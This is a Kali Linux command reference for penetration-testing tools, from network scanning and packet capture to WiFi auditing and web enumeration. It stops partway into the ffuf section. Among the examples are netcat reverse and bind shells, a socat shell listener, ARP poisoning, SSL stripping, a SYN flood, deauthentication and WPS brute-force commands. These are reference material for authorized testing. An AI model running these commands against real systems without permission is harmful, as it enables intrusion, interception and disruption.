# Kali Linux Tools Reference

Comprehensive CLI reference for penetration testing, network analysis, forensics, and security tools. For each tool: name, description, key flags, and practical examples.

Last updated: 2026-03-21 | Based on Kali 2025.3+

---

## Table of Contents

1. [Network Analysis](#1-network-analysis)
2. [Packet Capture](#2-packet-capture)
3. [Traffic Manipulation](#3-traffic-manipulation)
4. [Port Scanning](#4-port-scanning)
5. [DNS Tools](#5-dns-tools)
6. [WiFi](#6-wifi)
7. [Web Analysis](#7-web-analysis)
8. [Exploitation Frameworks](#8-exploitation-frameworks)
9. [Password / Hash](#9-password--hash)
10. [Forensics](#10-forensics)
11. [Reverse Engineering](#11-reverse-engineering)
12. [Crypto](#12-crypto)
13. [System](#13-system)
14. [Enumeration](#14-enumeration)
15. [Scripting](#15-scripting)

---

## 1. Network Analysis

### nmap (Network Mapper)

Network discovery and security auditing tool. As of Nmap 7.96, includes 612 NSE scripts.

**Key Flags:**

```
-sS            SYN scan (stealth, default for root)
-sT            TCP connect scan (full handshake)
-sU            UDP scan
-sV            Service/version detection
-sC            Run default NSE scripts (equivalent to --script=default)
-sn            Ping scan only (no port scan)
-sA            ACK scan (firewall rule detection)
-sW            Window scan
-sN/-sF/-sX    NULL/FIN/Xmas scans (stealth)
-O             OS detection
-A             Aggressive (OS + version + scripts + traceroute)
-T0-T5         Timing templates (0=paranoid, 5=insane)
-p             Port specification (-p 80,443 or -p 1-1000 or -p-)
-Pn            Skip host discovery (treat all hosts as online)
-n             No DNS resolution
-v / -vv       Verbose / very verbose
-oN/-oX/-oG    Output: normal/XML/grepable
-oA            Output all formats at once
--open         Show only open ports
--script       Run specific NSE scripts
--script-args  Pass arguments to scripts
-iL            Read targets from file
-e             Specify network interface
--top-ports    Scan N most common ports
--min-rate     Minimum packets per second
```

**Examples:**

```bash
# Quick scan of common ports
nmap -sV -sC 192.168.1.1

# Full TCP port scan with service detection
nmap -sS -sV -p- -T4 192.168.1.0/24

# Stealth SYN scan, top 1000 ports, OS detection
nmap -sS -O -T3 10.0.0.1

# UDP scan of common ports
nmap -sU --top-ports 100 192.168.1.1

# Aggressive scan with all output formats
nmap -A -T4 -oA scan_results 192.168.1.0/24

# Vulnerability scanning with NSE
nmap --script vuln 192.168.1.1
nmap --script "http-*" 192.168.1.1
nmap --script smb-vuln-ms17-010 192.168.1.0/24

# Scan specific ports
nmap -p 80,443,8080,8443 -sV 192.168.1.0/24

# Scan from file, skip ping
nmap -Pn -iL targets.txt -sV -oX results.xml

# Fast scan (top 100 ports)
nmap -F 192.168.1.0/24

# Detect firewall rules
nmap -sA -p 80,443 192.168.1.1

# Script with arguments
nmap --script http-brute --script-args http-brute.path=/admin 192.168.1.1

# OS fingerprinting
nmap -O --osscan-guess 192.168.1.1

# Traceroute
nmap --traceroute 192.168.1.1

# IPv6 scan
nmap -6 fe80::1

# Scan through proxy
nmap --proxies socks4://proxy:1080 192.168.1.1
```

---

### masscan

Internet-scale port scanner. Asynchronous SYN scanning at up to 10M packets/sec.

**Key Flags:**

```
--rate          Packets per second (default: 100)
--ports / -p    Port specification
--open          Show only open ports
--banners       Grab banners
-oL/-oX/-oG     Output: list/XML/grepable
--adapter       Specify network interface
--adapter-ip    Specify source IP
--source-port   Specify source port
--wait          Seconds to wait after scan complete (default: 10)
--excludefile   Exclude targets from file
```

**Examples:**

```bash
# Scan port 80 on entire subnet
masscan 192.168.1.0/24 -p80 --rate=1000

# Scan common web ports
masscan 10.0.0.0/8 -p80,443,8080,8443 --rate=10000 --open -oL results.txt

# Full port scan of single host
masscan 192.168.1.1 -p0-65535 --rate=1000 --banners

# Scan with banner grabbing
masscan 192.168.1.0/24 -p22,80,443 --banners --rate=500 -oX scan.xml

# Exclude hosts
masscan 10.0.0.0/8 -p80 --rate=10000 --excludefile exclude.txt
```

---

### netdiscover

Active/passive ARP reconnaissance tool for network discovery.

**Key Flags:**

```
-i     Interface
-r     Range to scan (CIDR)
-p     Passive mode (sniff only)
-c     Number of ARP requests per IP
-s     Sleep time between requests (ms)
-S     Enable sleep suppression
```

**Examples:**

```bash
# Active scan of subnet
netdiscover -i eth0 -r 192.168.1.0/24

# Passive mode (silent, sniff ARP traffic)
netdiscover -i eth0 -p

# Fast scan with fewer requests
netdiscover -i eth0 -r 10.0.0.0/24 -c 5
```

---

### arp-scan

Send ARP requests and display responses. Fast layer-2 host discovery.

**Key Flags:**

```
-l / --localnet   Scan local network
-I / --interface  Specify interface
-r / --retry      Number of retries
-t / --timeout    Timeout per host (ms)
-q / --quiet      Quiet mode
--destaddr        Destination MAC
```

**Examples:**

```bash
# Scan local network
arp-scan -l

# Scan specific interface
arp-scan -I eth0 -l

# Scan specific range
arp-scan 192.168.1.0/24

# Scan with MAC vendor lookup
arp-scan -l -I wlan0
```

---

### hping3

TCP/IP packet assembler and analyzer. Manual packet crafting.

**Key Flags:**

```
-S     SYN flag
-A     ACK flag
-F     FIN flag
-R     RST flag
-p     Destination port
-c     Packet count
-i     Interval between packets
-a     Spoof source address
--flood Flood mode (ignore replies)
--rand-source  Random source addresses
-1     ICMP mode
-2     UDP mode
```

**Examples:**

```bash
# SYN scan on port 80
hping3 -S -p 80 -c 3 192.168.1.1

# SYN flood (testing only)
hping3 -S --flood -p 80 192.168.1.1

# ACK scan (firewall detection)
hping3 -A -p 80 -c 5 192.168.1.1

# Traceroute via TCP
hping3 -S -p 80 -T --ttl 1 192.168.1.1

# ICMP ping
hping3 -1 -c 3 192.168.1.1

# Spoof source IP
hping3 -S -a 10.0.0.1 -p 80 192.168.1.1
```

---

### fping

Fast parallel ICMP ping utility.

**Key Flags:**

```
-a     Show alive hosts
-u     Show unreachable hosts
-g     Generate target list from CIDR or range
-c     Ping count per target
-q     Quiet (summary only)
-s     Print statistics
-f     Read targets from file
-r     Retry count
-t     Initial timeout (ms)
```

**Examples:**

```bash
# Ping sweep of subnet
fping -a -g 192.168.1.0/24

# Ping sweep, show only alive hosts, quiet
fping -a -q -g 192.168.1.0/24

# Ping range
fping -a -g 192.168.1.1 192.168.1.254

# Ping from file
fping -a -f targets.txt

# Ping with count and stats
fping -c 3 -s 192.168.1.1 192.168.1.2 192.168.1.3
```

---

## 2. Packet Capture

### tcpdump

Command-line packet analyzer. Captures and displays network traffic.

**Key Flags:**

```
-i          Interface (or "any" for all)
-c          Capture count (stop after N packets)
-w          Write to pcap file
-r          Read from pcap file
-n          Don't resolve hostnames
-nn         Don't resolve hostnames or port names
-v/-vv/-vvv Verbosity levels
-X          Show packet contents in hex and ASCII
-A          Show packet contents in ASCII
-s          Snap length (0 = full packet)
-e          Show link-layer header
-q          Quiet (less protocol info)
-l          Line-buffered output (for piping)
-D          List available interfaces
-G          Rotate capture file every N seconds
-C          Rotate capture file every N MB
```

**BPF Filter Syntax:**

```
host <ip>           Traffic to/from host
src host <ip>       Source host
dst host <ip>       Destination host
net <cidr>          Network range
port <port>         Port number
src port <port>     Source port
dst port <port>     Destination port
tcp / udp / icmp    Protocol
and / or / not      Boolean operators
```

**Examples:**

```bash
# Capture all traffic on eth0
tcpdump -i eth0 -nn

# Capture to file
tcpdump -i eth0 -w capture.pcap -c 1000

# Read pcap file
tcpdump -r capture.pcap -nn

# Filter by host
tcpdump -i eth0 host 192.168.1.1

# Filter by port
tcpdump -i eth0 port 80

# HTTP traffic with content
tcpdump -i eth0 -A -s 0 'tcp port 80'

# DNS queries
tcpdump -i eth0 -nn port 53

# SYN packets only
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Capture specific host and port, show hex
tcpdump -i eth0 -X host 192.168.1.1 and port 443

# Non-SSH traffic (exclude noise during remote session)
tcpdump -i eth0 -nn 'not port 22'

# ICMP traffic
tcpdump -i eth0 icmp

# Capture and rotate files (100MB each)
tcpdump -i eth0 -w capture_%Y%m%d_%H%M%S.pcap -C 100 -G 3600
```

---

### tshark (Wireshark CLI)

Network protocol analyzer. Full Wireshark dissection in CLI form.

**Key Flags:**

```
-i          Interface
-f          Capture filter (BPF syntax)
-Y          Display filter (Wireshark syntax)
-r          Read pcap file
-w          Write to pcap file
-c          Capture count
-T          Output format (fields, json, pdml, ps, psml, tabs, text)
-e          Field to display (with -T fields)
-E          Field output options (header=y, separator=,)
-V          Verbose (full protocol tree)
-q          Quiet (suppress continuous output)
-z          Statistics (conv,tcp | io,stat | http,tree | etc.)
-n          Disable name resolution
-2          Two-pass analysis
```

**Examples:**

```bash
# Live capture on interface
tshark -i eth0

# Capture with display filter
tshark -i eth0 -Y "http.request.method == GET"

# Read pcap, filter, show fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port

# HTTP requests only
tshark -i eth0 -Y "http.request" -T fields -e http.host -e http.request.uri

# DNS queries
tshark -i eth0 -Y "dns.qr == 0" -T fields -e dns.qry.name

# TCP conversations statistics
tshark -r capture.pcap -q -z conv,tcp

# IO statistics (bytes per second)
tshark -r capture.pcap -q -z io,stat,1

# Follow TCP stream
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Export as JSON
tshark -r capture.pcap -T json > output.json

# Capture to file with ring buffer
tshark -i eth0 -b filesize:10240 -b files:5 -w ring.pcap

# Extract HTTP objects
tshark -r capture.pcap --export-objects http,./exported/

# SSL/TLS handshake info
tshark -i eth0 -Y "tls.handshake" -T fields -e tls.handshake.type -e tls.handshake.extensions_server_name

# Two-pass analysis with display filter
tshark -2 -r capture.pcap -R "http.response.code == 200"
```

---

### ettercap

Comprehensive suite for MITM attacks on LAN.

**Key Flags:**

```
-T     Text-only interface
-G     GTK graphical interface
-i     Interface
-M     MITM attack method (arp, icmp, dhcp, port)
-F     Load filter from file
-L     Log to file
-w     Write pcap file
-q     Quiet mode
-P     Load plugin
```

**Examples:**

```bash
# ARP poisoning between target and gateway (text mode)
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# Sniff all traffic on LAN (passive)
ettercap -T -q -i eth0

# ARP poison entire subnet
ettercap -T -q -M arp:remote /192.168.1.1// ///

# With DNS spoofing plugin
ettercap -T -q -i eth0 -P dns_spoof -M arp /192.168.1.1// /192.168.1.100//
```

---

### bettercap

Modern, extensible MITM framework. Swiss Army knife for network attacks.

**Key Flags:**

```
-iface          Interface
-eval           Run commands at start
-caplet         Load caplet file
-no-history     Disable command history
-silent         Suppress output
```

**Examples:**

```bash
# Interactive mode
bettercap -iface eth0

# Network discovery
bettercap -iface eth0 -eval "net.probe on; net.show; sleep 5; quit"

# ARP spoofing + sniffing
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on"

# HTTP proxy with SSL stripping
bettercap -iface eth0 -eval "set http.proxy.sslstrip true; http.proxy on; arp.spoof on"

# WiFi scanning
bettercap -iface wlan0 -eval "wifi.recon on"

# BLE scanning
bettercap -iface hci0 -eval "ble.recon on"

# Caplet (script file) execution
bettercap -iface eth0 -caplet hstshijack/hstshijack
```

**Common Interactive Commands:**

```
net.probe on/off          Active network probing
net.show                  Show discovered hosts
net.sniff on/off          Packet sniffing
arp.spoof on/off          ARP spoofing
dns.spoof on/off          DNS spoofing
http.proxy on/off         HTTP proxy
https.proxy on/off        HTTPS proxy
wifi.recon on/off         WiFi recon
wifi.deauth <bssid>       WiFi deauthentication
set <module.param> <val>  Set parameter
help <module>             Module help
```

---

## 3. Traffic Manipulation

### socat

Multipurpose relay tool. Bidirectional data transfer between two channels.

**Key Flags:**

```
-v          Verbose (data transfer info)
-x          Hex dump of data
-d/-dd/-ddd Debug levels
-u          Unidirectional (left to right only)
-T          Timeout (seconds)
```

**Examples:**

```bash
# TCP port forwarder
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# UDP relay
socat UDP-LISTEN:5000,reuseaddr,fork UDP:10.0.0.1:5000

# SSL/TLS wrapper
socat TCP-LISTEN:443,fork,reuseaddr OPENSSL:target:443

# Connect to SSL service
socat - OPENSSL:target:443,verify=0

# Create a simple reverse shell listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# File transfer
socat TCP-LISTEN:9000 OPEN:received_file,creat
socat OPEN:file_to_send TCP:target:9000

# Port scanning
socat - TCP:target:80,connect-timeout=2

# Bind shell
socat TCP-LISTEN:1234,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

---

### netcat (nc / ncat)

Network utility for reading/writing across TCP/UDP connections.

**Key Flags (GNU netcat / ncat):**

```
-l          Listen mode
-p          Local port
-u          UDP mode
-v          Verbose
-n          No DNS resolution
-w          Timeout (seconds)
-z          Zero-I/O mode (scanning)
-e          Execute program on connect
-k          Keep listening after disconnect
-C          CRLF line endings
-s          Source address
```

**Examples:**

```bash
# Banner grabbing
nc -v 192.168.1.1 80
echo "HEAD / HTTP/1.1\r\nHost: target\r\n\r\n" | nc 192.168.1.1 80

# Port scan
nc -zv 192.168.1.1 20-100

# File transfer (receiver)
nc -l -p 9000 > received_file
# File transfer (sender)
nc 192.168.1.100 9000 < file_to_send

# Chat server
nc -l -p 1234                    # Server
nc 192.168.1.100 1234            # Client

# Reverse shell (listener)
nc -lvnp 4444
# Reverse shell (target)
nc -e /bin/bash 192.168.1.100 4444

# UDP listener
nc -lu 5000

# Bind shell
nc -l -p 4444 -e /bin/bash

# Proxy / relay
mkfifo /tmp/pipe
nc -l -p 8080 < /tmp/pipe | nc target 80 > /tmp/pipe

# ncat (nmap's enhanced netcat) with SSL
ncat --ssl target 443
ncat --ssl-listen -p 443

# ncat with allow/deny lists
ncat -l -p 8080 --allow 192.168.1.0/24
```

---

### proxychains

Force TCP connections through proxy servers (SOCKS4, SOCKS5, HTTP).

**Config:** `/etc/proxychains4.conf`

**Key Options (in config):**

```
dynamic_chain      Use all proxies in order, skip dead ones
strict_chain       All proxies must be online
random_chain       Random proxy order
chain_len          Number of proxies for random_chain
proxy_dns          Proxy DNS requests too
tcp_read_time_out  TCP read timeout
tcp_connect_time_out TCP connect timeout
```

**Examples:**

```bash
# Run nmap through proxy
proxychains nmap -sT -Pn 10.0.0.1

# Run any tool through proxy
proxychains curl http://target.com
proxychains firefox
proxychains ssh user@target

# With specific config
proxychains -f custom_proxychains.conf nmap -sT 10.0.0.1

# Config file format (/etc/proxychains4.conf):
# [ProxyList]
# socks5 127.0.0.1 9050        # Tor
# socks4 127.0.0.1 1080        # Local SOCKS proxy
# http 10.0.0.1 8080           # HTTP proxy
```

---

### mitmproxy

Interactive HTTPS-capable MITM proxy.

**Key Flags:**

```
-p          Listen port (default: 8080)
-m          Mode (regular, transparent, socks5, reverse, upstream)
--ssl-insecure  Don't verify upstream SSL
-s          Load script
-w          Write flows to file
-r          Read flows from file
--set       Set option
```

**Examples:**

```bash
# Interactive TUI proxy
mitmproxy -p 8080

# Dump mode (non-interactive)
mitmdump -p 8080

# Web interface
mitmweb -p 8080

# Transparent proxy mode
mitmproxy --mode transparent -p 8080

# Reverse proxy
mitmproxy --mode reverse:http://target:80 -p 8080

# Record all traffic
mitmdump -p 8080 -w traffic.flow

# Replay traffic
mitmdump -r traffic.flow

# Filter specific requests
mitmdump -p 8080 "~u /api/"

# With script
mitmdump -s modify_requests.py -p 8080

# SOCKS5 proxy mode
mitmproxy --mode socks5 -p 1080
```

---

## 4. Port Scanning

### nmap

See [Network Analysis > nmap](#nmap-network-mapper) for full reference.

---

### rustscan

Ultra-fast port scanner written in Rust. Scans all 65535 ports in seconds, then pipes to nmap.

**Key Flags:**

```
-a / --addresses    Target addresses
-p / --ports        Specific ports
-b / --batch-size   Batch size (default: 4500)
-t / --timeout      Timeout (ms)
-u / --ulimit       Max open files
--scan-order        serial or random
--udp               UDP scan
--accessible        Accessible mode (no ASCII art)
--greppable         Greppable output
--scripts           Script engine (default, custom, none)
--                  Pass remaining args to nmap
```

**Examples:**

```bash
# Quick full port scan with nmap follow-up
rustscan -a 192.168.1.1 -- -sV -sC

# Custom port range
rustscan -a 192.168.1.1 -p 1-10000

# Specific ports
rustscan -a 192.168.1.1 -p 80,443,8080

# Adjust batch size (larger = faster, more aggressive)
rustscan -a 192.168.1.1 -b 10000

# Scan multiple hosts
rustscan -a 192.168.1.1,192.168.1.2,192.168.1.3

# Scan subnet with nmap service detection
rustscan -a 192.168.1.0/24 -- -sV -A -T4

# Greppable output
rustscan -a 192.168.1.1 --greppable
```

---

### unicornscan

Asynchronous stateless TCP/UDP scanner. Uses userland TCP/IP stack.

**Key Flags:**

```
-m          Scan mode (T=TCP SYN, Ts=TCP connect, U=UDP)
-p          Ports
-r          Packets per second
-i          Interface
-l          Log to file
-e          Enable module
-G          Payload group
-v          Verbose
```

**Examples:**

```bash
# TCP SYN scan
unicornscan -mT 192.168.1.1:1-65535 -r 1000

# UDP scan
unicornscan -mU 192.168.1.1:1-65535 -r 500

# Scan with verbose output
unicornscan -mTs -v 192.168.1.1:80,443,8080
```

**Note:** unicornscan is no longer actively maintained. Prefer rustscan or masscan for similar use cases.

---

## 5. DNS Tools

### dig

DNS lookup utility. Most flexible DNS query tool.

**Key Flags:**

```
@server     DNS server to query
-t          Record type (A, AAAA, MX, NS, SOA, TXT, CNAME, ANY)
+short      Concise output
+noall +answer  Show only answer section
+trace      Trace delegation path
+dnssec     Request DNSSEC records
-x          Reverse lookup
-p          Port
```

**Examples:**

```bash
# Standard A record lookup
dig example.com

# Specific record types
dig example.com MX
dig example.com NS
dig example.com TXT
dig example.com AAAA
dig example.com SOA
dig example.com ANY

# Short output
dig +short example.com

# Query specific DNS server
dig @8.8.8.8 example.com

# Reverse DNS
dig -x 8.8.8.8

# Trace full resolution path
dig +trace example.com

# Zone transfer attempt
dig @ns1.example.com example.com AXFR

# Show only answer section
dig +noall +answer example.com

# DNSSEC validation
dig +dnssec example.com
```

---

### nslookup

Interactive DNS query tool.

```bash
# Basic lookup
nslookup example.com

# Specify DNS server
nslookup example.com 8.8.8.8

# Query specific record type
nslookup -type=MX example.com
nslookup -type=NS example.com
nslookup -type=TXT example.com

# Reverse lookup
nslookup 8.8.8.8

# Interactive mode
nslookup
> server 8.8.8.8
> set type=MX
> example.com
> exit
```

---

### dnsenum

DNS enumeration tool. Discovers subdomains, MX, NS, zone transfers.

**Key Flags:**

```
--enum          Shortcut for all enumeration options
--dnsserver     Use specific DNS server
-f              Subdomain wordlist file
--subfile       Output subdomains to file
-t              TCP timeout
--threads       Number of threads
-p              Pages to scrape for subdomains
-s              Maximum subdomains from scraping
```

**Examples:**

```bash
# Full enumeration
dnsenum example.com

# With custom wordlist
dnsenum -f /usr/share/wordlists/dnsmap.txt example.com

# Quick enum with threading
dnsenum --threads 10 example.com

# Save subdomains
dnsenum --subfile subs.txt example.com
```

---

### dnsrecon

DNS reconnaissance tool. Multiple enumeration techniques.

**Key Flags:**

```
-d          Domain
-t          Enumeration type (std, brt, rvl, srv, axfr, zonewalk)
-D          Dictionary file for brute force
-n          Nameserver
-r          IP range for reverse lookup
--threads   Threads
-j / -x     Output JSON / XML
-c          Output CSV
```

**Examples:**

```bash
# Standard enumeration
dnsrecon -d example.com

# Brute force subdomains
dnsrecon -d example.com -t brt -D /usr/share/wordlists/dnsmap.txt

# Zone transfer
dnsrecon -d example.com -t axfr

# Reverse lookup range
dnsrecon -r 192.168.1.0/24

# SRV record enumeration
dnsrecon -d example.com -t srv

# JSON output
dnsrecon -d example.com -j output.json

# Cache snooping
dnsrecon -t snoop -n 192.168.1.1 -D /usr/share/wordlists/dnsmap.txt
```

---

### fierce

DNS reconnaissance and subdomain scanner.

**Examples:**

```bash
# Domain scan
fierce --domain example.com

# With custom DNS server
fierce --domain example.com --dns-servers 8.8.8.8

# With custom wordlist
fierce --domain example.com --subdomain-file wordlist.txt

# Specify range for reverse lookups
fierce --domain example.com --range 192.168.1.0/24
```

---

## 6. WiFi

### aircrack-ng Suite

Complete WiFi security auditing toolset.

#### airmon-ng (Monitor Mode)

```bash
# Check for interfering processes
airmon-ng check kill

# Start monitor mode
airmon-ng start wlan0

# Stop monitor mode
airmon-ng stop wlan0mon

# Check status
airmon-ng
```

#### airodump-ng (Capture)

```bash
# Scan all networks
airodump-ng wlan0mon

# Capture specific channel
airodump-ng -c 6 wlan0mon

# Capture specific BSSID, write to file
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Filter by encryption
airodump-ng --encrypt WPA2 wlan0mon
airodump-ng --encrypt WEP wlan0mon

# Show WPS info
airodump-ng --wps wlan0mon

# Output formats
airodump-ng -w output --output-format pcap,csv,kismet wlan0mon
```

#### aireplay-ng (Injection)

```bash
# Deauthentication attack (disconnect client)
aireplay-ng -0 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# -0: deauth, 10: count, -a: AP, -c: client

# Broadcast deauth (all clients)
aireplay-ng -0 5 -a <BSSID> wlan0mon

# Fake authentication
aireplay-ng -1 0 -a <BSSID> -h <OUR_MAC> wlan0mon

# ARP request replay
aireplay-ng -3 -b <BSSID> -h <OUR_MAC> wlan0mon

# Interactive packet replay
aireplay-ng -2 -r captured.cap wlan0mon
```

#### aircrack-ng (Cracking)

```bash
# Crack WPA/WPA2 with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Crack WEP
aircrack-ng capture-01.cap

# Specify BSSID
aircrack-ng -b AA:BB:CC:DD:EE:FF -w wordlist.txt capture-01.cap

# Use multiple wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap

# Crack with airolib-ng database
aircrack-ng -r pmk_db capture-01.cap
```

#### Other aircrack-ng tools

```bash
# airdecap-ng — Decrypt WEP/WPA captures
airdecap-ng -w <WEP_KEY> capture.cap
airdecap-ng -p <PASSPHRASE> -e <ESSID> capture.cap

# airbase-ng — Create fake access point
airbase-ng -a AA:BB:CC:DD:EE:FF --essid "FakeAP" -c 6 wlan0mon

# airolib-ng — Manage PMK database
airolib-ng pmk_db --import essid essid_list.txt
airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng pmk_db --batch

# packetforge-ng — Create custom packets
packetforge-ng -0 -a <BSSID> -h <OUR_MAC> -k <DST_IP> -l <SRC_IP> -y keystream.xor -w forged.cap
```

---

### wifite / wifite2

Automated wireless auditing tool.

```bash
# Auto-scan and attack
wifite

# Target specific encryption
wifite --wpa
wifite --wep

# Target specific BSSID
wifite --bssid AA:BB:CC:DD:EE:FF

# Use specific wordlist
wifite --dict /usr/share/wordlists/rockyou.txt

# Specify interface
wifite -i wlan0

# Set minimum signal strength
wifite --power 50

# Kill interfering processes
wifite --kill

# WPS attacks only
wifite --wps
```

---

### kismet

Wireless network detector, sniffer, and IDS.

```bash
# Start kismet
kismet

# Specify interface
kismet -c wlan0

# With specific source
kismet -c wlan0:name=my_wifi

# Log to specific directory
kismet --log-prefix /tmp/kismet_logs

# Headless mode (REST API only)
kismet --no-ncurses

# REST API access (default: http://localhost:2501)
# Default credentials: kismet / kismet
curl -u kismet:kismet http://localhost:2501/devices/all_devices.json
```

---

### reaver

WPS brute force attack tool.

```bash
# Standard WPS attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie dust attack (faster)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# With delay between attempts
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -vv

# Specify channel
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Resume previous session
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --session=previous.session
```

---

## 7. Web Analysis

### curl

Transfer data from/to servers. Supports HTTP, HTTPS, FTP, and many more protocols.

**Key Flags:**

```
-X          HTTP method (GET, POST, PUT, DELETE, PATCH)
-H          Header
-d          POST data
-F          Form data (multipart)
-o          Output to file
-O          Save with remote filename
-L          Follow redirects
-k          Ignore SSL errors
-v          Verbose
-s          Silent
-I          HEAD request (headers only)
-u          User:password
-b          Send cookies
-c          Save cookies
-x          Use proxy
-A          User-Agent
--data-raw  Raw POST data
--json      Send JSON (sets content-type)
-w          Write-out format string
--connect-timeout  Connection timeout
```

**Examples:**

```bash
# GET request
curl http://target.com/api/users

# POST JSON
curl -X POST -H "Content-Type: application/json" -d '{"user":"admin","pass":"test"}' http://target.com/login

# POST form data
curl -X POST -d "user=admin&pass=test" http://target.com/login

# Headers only
curl -I http://target.com

# Follow redirects, verbose
curl -Lv http://target.com

# With authentication
curl -u admin:password http://target.com/admin

# Download file
curl -O http://target.com/file.zip

# With cookies
curl -b "session=abc123" http://target.com/dashboard

# Through proxy
curl -x http://proxy:8080 http://target.com

# Custom User-Agent
curl -A "Mozilla/5.0" http://target.com

# Upload file
curl -F "file=@/path/to/file.txt" http://target.com/upload

# Show response time
curl -o /dev/null -s -w "DNS: %{time_namelookup}s\nConnect: %{time_connect}s\nTTFB: %{time_starttransfer}s\nTotal: %{time_total}s\n" http://target.com

# SSL/TLS info
curl -vI https://target.com 2>&1 | grep -i "ssl\|tls\|subject\|issuer"
```

---

### wget

Non-interactive network file downloader.

**Key Flags:**

```
-O          Output filename
-P          Directory prefix
-r          Recursive download
-l          Recursion depth
-np         No parent directory
-k          Convert links for offline
-m          Mirror mode
-c          Continue partial download
-q          Quiet
--no-check-certificate  Ignore SSL
--spider    Don't download, check existence
-U          User-Agent
--limit-rate Rate limit
```

**Examples:**

```bash
# Download file
wget http://target.com/file.zip

# Mirror entire site
wget -m -k -np http://target.com/

# Recursive download (depth 2)
wget -r -l 2 http://target.com/

# Download with rate limit
wget --limit-rate=1m http://target.com/large_file.iso

# Check if URL exists
wget --spider http://target.com/page.html

# Download from list
wget -i urls.txt
```

---

### httpie

User-friendly HTTP client (modern curl alternative).

```bash
# GET request
http GET http://target.com/api/users

# POST JSON (default)
http POST http://target.com/api/users name=admin email=admin@test.com

# POST form data
http -f POST http://target.com/login user=admin pass=test

# Custom headers
http GET http://target.com/api Authorization:"Bearer token123"

# Download file
http --download http://target.com/file.zip

# Follow redirects
http --follow http://target.com

# Verbose
http -v GET http://target.com

# With session persistence
http --session=mysession POST http://target.com/login user=admin pass=test
http --session=mysession GET http://target.com/dashboard
```

---

### nikto

Web server vulnerability scanner.

**Key Flags:**

```
-h          Target host
-p          Port
-ssl        Force SSL
-output     Output file
-Format     Output format (htm, csv, txt, xml)
-Tuning     Scan tuning (0-9, a-c)
-Plugins    Specific plugins
-evasion    IDS evasion techniques (1-8)
-timeout    Timeout per request
-useproxy   Use proxy
-update     Update databases
```

**Examples:**

```bash
# Basic scan
nikto -h http://192.168.1.1

# Scan specific port with SSL
nikto -h 192.168.1.1 -p 443 -ssl

# Full scan with output
nikto -h http://target.com -output scan.html -Format htm

# Scan through proxy
nikto -h http://target.com -useproxy http://proxy:8080

# Tuning: only check for specific categories
nikto -h http://target.com -Tuning 1234
# 0: File upload  1: Interesting files  2: Misconfigurations
# 3: Info disclosure  4: Injection (XSS/Script)  5: Remote retrieval
# 6: Denial of Service  7: Remote retrieval (server-wide)
# 8: Command execution  9: SQL injection
# a: Authentication bypass  b: Software identification  c: Remote inclusion

# IDS evasion
nikto -h http://target.com -evasion 1
# 1: Random URI encoding  2: Self-reference directory
# 3: Premature URL ending  4: Prepend long random string
# 5: Fake parameter  6: TAB as request spacer
# 7: Change case of URL  8: Use Windows directory separator
```

---

### dirb

Web content scanner. URL brute forcing.

```bash
# Basic scan with default wordlist
dirb http://target.com

# Custom wordlist
dirb http://target.com /usr/share/wordlists/dirb/big.txt

# With authentication
dirb http://target.com -u admin:password

# Specific extensions
dirb http://target.com -X .php,.html,.txt

# With proxy
dirb http://target.com -p http://proxy:8080

# Ignore specific HTTP codes
dirb http://target.com -N 302

# Case-insensitive search
dirb http://target.com -z 50    # 50ms delay between requests

# Output to file
dirb http://target.com -o results.txt

# Custom User-Agent
dirb http://target.com -a "Mozilla/5.0"

# Non-recursive
dirb http://target.com -r
```

---

### gobuster

Directory/DNS/VHost brute forcing tool written in Go.

**Modes:** `dir`, `dns`, `vhost`, `fuzz`, `s3`, `gcs`, `tftp`

**Key Flags (dir mode):**

```
-u          Target URL
-w          Wordlist
-t          Threads (default: 10)
-x          Extensions to search
-o          Output file
-s          Positive status codes
-b          Negative status codes
-k          Skip TLS verification
-r          Follow redirects
-H          Custom header
-c          Cookies
-a          User-Agent
-p          Proxy URL
--no-error  Don't display errors
-n          Don't print status codes
```

**Examples:**

```bash
# Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js

# High thread count
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -t 50

# VHost enumeration
gobuster vhost -u http://target.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt

# With specific status codes
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,307" -b ""

# Output to file
gobuster dir -u http://target.com -w wordlist.txt -o results.txt

# With authentication cookie
gobuster dir -u http://target.com -w wordlist.txt -c "session=abc123"
```

---

### ffuf (Fuzz Faster U Fool)

Fast web fuzzer written in Go.

**Key Flags:**

```
-u          URL with FUZZ keyword
-w          Wordlist
-X          HTTP method
-d          POST data
-H          Header
-t          Threads (default: 40)
-mc         Match HTTP status codes
-ms         Match response size
-mw         Match word count
-ml         Match line count
-mr         Match regex
-fc         Filter HTTP status codes
-fs         Filter response size
-fw         Filter word count
-fl         Filter line count
-fr         Filter regex
-o          Output file
-of         Output format (json, ejson, html, md, csv, all)
-rate       Requests per second
-timeout    HTTP request timeout
-recursion  Enable recursion
-e          Extensions
-ic         Ignore comments in wordlist
-c          Colorize output
-v          Verbose
```

**Examples:**

```bash
